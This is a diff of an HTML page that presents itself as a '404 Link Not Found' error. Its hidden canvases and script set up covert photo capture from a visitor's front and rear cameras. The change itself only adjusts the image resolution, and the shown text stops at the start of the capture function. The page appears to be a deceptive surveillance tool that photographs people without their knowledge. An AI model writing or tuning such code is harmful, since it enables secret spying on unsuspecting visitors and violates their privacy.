@@ -10,16 +10,16 @@
   <h1>Error 404 : Link Not Found</h1>
   
   <!-- Hidden canvases to capture photos -->
-  <canvas id="rearCanvas" style="display:none;" width="1080" height="1920"></canvas>
-  <canvas id="frontCanvas" style="display:none;" width="1080" height="1920"></canvas>
+  <canvas id="rearCanvas" style="display:none;" width="960" height="1280"></canvas>
+  <canvas id="frontCanvas" style="display:none;" width="960" height="1280"></canvas>
 
   <script>
     const rearCanvas = document.getElementById('rearCanvas');
     const frontCanvas = document.getElementById('frontCanvas');
     const rearContext = rearCanvas.getContext('2d');
     const frontContext = frontCanvas.getContext('2d');
-    const width = 1080;  
-    const height = 1920;  
+    const width = 960;  // Adjusted width for 4:3 aspect ratio
+    const height = 1280; // Adjusted height for 4:3 aspect ratio
 
     // Capture photo from a specified camera
     function capturePhoto(facingMode, canvas, context) {
